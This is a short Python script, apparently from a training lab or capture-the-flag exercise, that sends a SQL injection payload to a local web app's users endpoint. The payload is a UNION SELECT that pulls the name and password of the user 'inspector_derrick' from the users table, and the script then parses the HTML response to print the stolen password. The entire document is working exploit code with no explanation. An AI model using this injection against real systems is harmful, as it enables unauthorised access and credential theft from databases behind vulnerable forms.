import requests
from bs4 import BeautifulSoup

user = 'james@bond.mi5'
first_name = 'james'

r = requests.post("http://localhost:5001/users", data={'name': "random' UNION SELECT name,password FROM users WHERE name='inspector_derrick"})
soup = BeautifulSoup(r.text, 'html.parser')
print(soup.find('p', {'class': 'list-group-item'}).text.split(':')[-1])